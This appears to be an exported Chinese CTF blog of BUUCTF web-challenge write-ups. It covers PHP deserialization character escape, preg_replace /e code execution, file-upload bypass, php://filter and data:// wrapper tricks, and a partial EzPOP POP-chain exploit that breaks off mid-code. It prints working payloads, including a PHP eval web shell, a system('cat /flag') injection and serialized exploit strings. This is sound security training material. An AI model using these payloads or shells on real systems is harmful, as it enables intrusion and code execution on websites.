<p>首先看到了提示phpinfo里面有东西，刚好源码上面并没有提示flag在哪里，进去查看后发现了d0g3_flag.php<br><img src="/2020/04/04/BUU-web%E4%BA%8C/15.png" alt></p>
<p>开始传入<code>f</code>作为<code>$funcion</code>并且定义了一个filter函数，会将传入的$img中的<code>&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;</code>替换为空<br>这里我们发现被替换的这里个单词中只有php为3个字符，其余均为4个字符。有可能存在字符逃逸漏洞<br>刚好在昨天做了一个将where替换为hacker的字符逃逸，这一个为替换为空<br>使用seay审计一下，发现存在变量覆盖和任意文件读取<br><img src="/2020/04/04/BUU-web%E4%BA%8C/16.png" alt></p>
<h2 id="user-function逃逸"><a href="#user-function逃逸" class="headerlink" title="user+function逃逸"></a>user+function逃逸</h2><p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = aphphphphphp;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"><span class="keyword">echo</span> $serialize_info;</span><br></pre></td></tr></table></figure>

<p>运行结果为</p>
<blockquote>
<p>a:3:{s:4:”user”;s:5:”guest”;s:8:”function”;s:12:”ahh”;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;}</p>
</blockquote>
<p>如果不filter的结果为</p>
<blockquote>
<p>a:3:{s:4:”user”;s:5:”guest”;s:8:”function”;s:12:”aphphphphphp”;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;}</p>
</blockquote>
<p>可以发现有字符逃逸出去了，但是我们要读取d0g3_flag.php即要将img后面的值便为ZDBnM19mMWFnLnBocA==，所以我们要将guest的位置使用filter替换掉，再将我们要读取的文件(s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”)写在<code>aphphphphphp</code>这个位置。所以我么要把<code>&quot;;s:8:&quot;function&quot;;s:12:&quot;</code>利用字符逃逸包含掉</p>
<p>构造：</p>
<blockquote>
<p>$_SESSION[“user”] = ‘flagflagflagflagflagflag’;<br>$_SESSION[‘function’] = ‘aphphphphphp’;</p>
</blockquote>
<blockquote>
<p>a:3:{s:4:”user”;s:24:””;s:8:”function”;s:12:”ahh”;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;}</p>
</blockquote>
<p>我们可以看到<code>&quot;;s:8:&quot;function&quot;;s:12:&quot;a</code>已经被s:24:包含，这是我们需要构造<code>$_SESSION[&#39;function&#39;]</code>来包含<code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;</code>.</p>
<p>所以构造(要先将前面的“闭合)</p>
<blockquote>
<p>$_SESSION[“user”] = ‘flagflagflagflagflagflag’;<br>$_SESSION[‘function’] = ‘1”s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}’;</p>
</blockquote>
<p>结果</p>
<blockquote>
<p>a:3:{s:4:”user”;s:24:”<strong>“;s:8:”function”;s:41:”1</strong>“s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}”;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;}</p>
</blockquote>
<p>这样便刚好合适，并且”;}后面的值会自动忽略，但是少了一个值，我们随便添加一个就好了。<br>然后我们构造payload为：</p>
<figure class="highlight openscad"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=</span><span class="number">1</span><span class="string">";s:3:"</span>img<span class="string">";s:20:"</span>ZDBnM19mMWFnLnBocA==<span class="string">";s:1:"</span>a<span class="string">";s:1:"</span>a<span class="string">";&#125;</span></span><br><span class="line"><span class="string">GET:</span></span><br><span class="line"><span class="string">f=show_image</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/BUU-web%E4%BA%8C/17.png" alt><br><img src="/2020/04/04/BUU-web%E4%BA%8C/18.png" alt><br>然后查看源码便可以得到flag的真实位置，再换一下就好了<br><img src="/2020/04/04/BUU-web%E4%BA%8C/19.png" alt></p>
<h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><p>开始给出源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个分别用php://filter协议和data://协议读取文件和要求的字符串就行</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=<span class="keyword">next</span>.php&amp;text=data:<span class="regexp">//</span>text<span class="regexp">/plain;base64,SSBoYXZlIGEgZHJlYW0=</span></span><br></pre></td></tr></table></figure>

<p>然后得到base64，解码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到存在<code>preg_replace  /e</code>的命令执行漏洞,参考下面这篇文章</p>
<p><a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">深入研究preg_replace与代码执行</a></p>
<p>?\S*=${phpinfo()}<br><img src="/2020/04/04/BUU-web%E4%BA%8C/20.png" alt></p>
<p>构造payload:<br>我们可以直接使用getFlag()函数</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">?\S*=$&#123;getFlag()&#125;&amp;<span class="keyword">cmd</span><span class="bash">=system(<span class="string">'cat /flag'</span>);</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/BUU-web%E4%BA%8C/21.png" alt></p>
<h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><p>测试后提示不能为php，然后考虑.htaccess和.user.ini<br>但是这个为apache服务器，所以只能使用.htaccess如果为nginx服务器的话就使用.user.ini。但是上传的时候要修改mine文件类型<br>这个好像还检查了文件内容，我们可以使用js来写</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'php'</span>&gt;</span><span class="javascript"> @<span class="built_in">eval</span>($_POST[<span class="string">'pass'</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>这个题前面与<code>[BJDCTF2020]ZJCTF，不过如此</code>有几分相似，通过两个伪协议读取源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">?text=data://text/plain;<span class="built_in">base64</span>,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/<span class="built_in">read</span>=<span class="built_in">convert</span>.<span class="built_in">base64</span>-encode/resource=useless.php</span><br></pre></td></tr></table></figure>

<p>useless.php读取出来后解码得到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span> IAo</span><br></pre></td></tr></table></figure>

<p>我们要读取flag.php，那么就要让$this-&gt;file变为flag.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">"flag.php"</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> Flag();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
</blockquote>
<p>然后通过password传入便可以了<br>payload</p>
<blockquote>
<p>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}&amp;file=useless.php</p>
</blockquote>
<p>查看源码得到flag<br><img src="/2020/04/04/BUU-web%E4%BA%8C/22.png" alt></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU-web四</title>
    <url>/2020/04/14/BUU-web4/</url>
    <content><![CDATA[<p>BUUCTF-web刷题（四）</p>
<p><strong>[EIS 2019]EzPOP</strong><br>知识点：PHP反序列化-pop链构造</p>
<p><strong>[GYCTF2020]Easyphp</strong><br>知识点：PHP反序列化、字符逃逸、POP</p>
<p><strong>[CISCN2019Web2]ikun</strong><br>知识点：python序列化</p>
<p><strong>[ACTF2020新生赛]Exec</strong><br>知识点：命令执行</p>
<p><strong>[BJDCTF2020]EasySearch</strong><br>知识点：SSI注入</p>
<p><strong>NCTF2019]Fake XML cookbook</strong><br>知识点：xxe</p>
<p><strong>[CISCN2019Web1]Easyweb</strong><br>知识点：备份文件泄露、SQL注入、php短标签</p>
<p><strong>[网鼎杯2018]Comment</strong><br>知识点：git源码泄露、二次注入</p>
<a id="more"></a>

<h1 id="EIS-2019-EzPOP"><a href="#EIS-2019-EzPOP" class="headerlink" title="[EIS 2019]EzPOP"></a>[EIS 2019]EzPOP</h1><p>给出源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($store, $key = <span class="string">'flysystem'</span>, $expire = null)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = $key;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = $store;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;expire = $expire;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span><span class="params">(array $contents)</span> </span>&#123;</span><br><span class="line">        $cachedProperties = array_flip([</span><br><span class="line">            <span class="string">'path'</span>, <span class="string">'dirname'</span>, <span class="string">'basename'</span>, <span class="string">'extension'</span>, <span class="string">'filename'</span>,</span><br><span class="line">            <span class="string">'size'</span>, <span class="string">'mimetype'</span>, <span class="string">'visibility'</span>, <span class="string">'timestamp'</span>, <span class="string">'type'</span>,</span><br><span class="line">        ]);</span><br><span class="line">        <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $cleaned = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line">        <span class="keyword">return</span> json_encode([$cleaned, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, $contents, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;autosave) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;save();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getExpireTime</span><span class="params">($expire)</span>: <span class="title">int</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (int) $expire;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span><span class="params">(string $name)</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>] . $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span><span class="params">($data)</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (string) $data;</span><br><span class="line">        &#125;</span><br><span class="line">        $serialize = <span class="keyword">$this</span>-&gt;options[<span class="string">'serialize'</span>];</span><br><span class="line">        <span class="keyword">return</span> $serialize($data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value, $expire = null)</span>: <span class="title">bool</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">            $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">'expire'</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;getExpireTime($expire);</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line"></span><br><span class="line">        $dir = dirname($filename);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir($dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize($value);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $data = <span class="string">"&lt;?php\n//"</span> . sprintf(<span class="string">'%012d'</span>, $expire) . <span class="string">"\n exit();?&gt;\n"</span> . $data;</span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line">$dir = <span class="string">"uploads/"</span>;</span><br><span class="line"><span class="keyword">if</span> (!is_dir($dir))</span><br><span class="line">&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure>

<p>代码审计：<br>首先在B类的set方法里发现有一个可以写入文件的地方，也许可以利用这里来写入一句话木马。</p>
<blockquote>
<p>$result = file_put_contents($filename, $data);</p>
</blockquote>
<p>然后发现在A类的__destruct()方法里发现可以调用save方法，并且save方法又调用了set方法，所以大致的pop链流程为：</p>
<blockquote>
<p>new  A =&gt; __destruct() =&gt; save() =&gt; set() =&gt;  file_put_contents()</p>
</blockquote>
<p>然后再来看写如文件的两个参数$filename和$data有什么限制<br>$filename通过set()函数的$name传入，然后经过getCacheKey($name)函数将文件名缓存处理后传给$filename,</p>
<p>$data是通过set()函数的$value变量传入 ，经过一次序列化传入$data,然后经过gzcompress函数压缩。再与<code>&quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot;</code>拼接。其中还有$expire参数</p>
<p>$expire通过set函数传入后经过getExpiireTime函数处理，也就是将其转为整型。</p>
<p>因为在后面写入文件的时候，前面拼接了一段别的<code>php代码</code></p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="string">"&lt;?php<span class="subst">\n</span>//"</span> . sprintf('%<span class="number">012</span>d', $expire) . <span class="string">"<span class="subst">\n</span> exit();?&gt;<span class="subst">\n</span>"</span></span><br></pre></td></tr></table></figure>

<p>而且这段代码会导致即便我们在后面拼接上<code>shell</code>也无法正常执行。<br>这里有道原题叫<a href="https://blog.csdn.net/ITmincherry/article/details/96166423" target="_blank" rel="noopener">死亡退出</a>，并且<code>file_put_contents</code>是支持<code>php伪协议</code>的，所以我们可以通过<code>php://filter/write=convert.base64-decode/</code>来将</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">$data   = <span class="string">"&lt;?php\n//"</span> . <span class="keyword">sprintf</span>(<span class="string">'%012d'</span>, $expire) . <span class="string">"\n exit();?&gt;\n"</span> . $data;</span><br><span class="line">$result = file_put_contents($filename, $data);</span><br></pre></td></tr></table></figure>

<p>这段代码中的$data全部用base64解码转化过后再写入文件中，其中前面拼接部分会被强制解码，从而变成一堆乱码。而我们写入的shell（base64编码过的）会解码成正常的木马文件。<br>这里唯一需要注意的是长度问题，我们需要shell部分<code>&lt;?php phpinfo()?&gt;</code>前面加起来的字节数为4的倍数(base64解码时不影响shell部分)。<br>所以$b-&gt;options[‘prefix’]=’php://filter/write=convert.base64-decode/resource=./uploads/‘;</p>
<p>$data中的$vaule实际上是A类中<code>getForStorage()</code>的返回值<br><img src="/2020/04/14/BUU-web4/1.png" alt><br><code>A::getForStorage()</code>返回<code>json_encode([A::cleanContents(A::cache), A::complete]);</code></p>
<p>接下来就是构造$a-&gt;catch</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span><span class="params">(array $contents)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $cachedProperties = array_flip([</span><br><span class="line">        <span class="string">'path'</span>, <span class="string">'dirname'</span>, <span class="string">'basename'</span>, <span class="string">'extension'</span>, <span class="string">'filename'</span>,</span><br><span class="line">        <span class="string">'size'</span>, <span class="string">'mimetype'</span>, <span class="string">'visibility'</span>, <span class="string">'timestamp'</span>, <span class="string">'type'</span>,</span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">            $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $contents;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   $cleaned = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line">    <span class="keyword">return</span> json_encode([$cleaned, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, $contents, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在cleanContents()中，array_intersect_key()是比较两个数组的键名，并返回交集。所以我们$object的键选$cachedProperties中任意一个都行，这里选择path。值就是我们的shell的base64编码，<br>PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pOz8+<br>即：</p>
<figure class="highlight ocaml"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">object</span> = <span class="built_in">array</span>(<span class="string">"path"</span>=&gt;<span class="string">"PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pOz8+"</span>);</span><br></pre></td></tr></table></figure>

<p>如果我们设值$path=’1’,$complete=’2’，则最后得到的$contents会是</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[&#123;<span class="attr">"1"</span>:&#123;<span class="attr">"path"</span>:<span class="string">"JTNDJTNGcGhwJTIwZXZhbCUyOCUyNF9HRVQlNUIlMjd6eiUyNyU1RCUyOSUzQiUzRiUzRQ=="</span>&#125;&#125;,<span class="string">"2"</span>]</span><br></pre></td></tr></table></figure>

<p>其中$complete=’2’因为在shell后面，所以并不影响解码。当$path=’111’时，可以正常解码shell</p>
<p>exp：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $store;</span><br><span class="line">    <span class="keyword">protected</span> $key;</span><br><span class="line">    <span class="keyword">protected</span> $expire;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;key = <span class="string">'pz.php'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span><span class="params">($tmp)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;store = $tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $options;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> A();</span><br><span 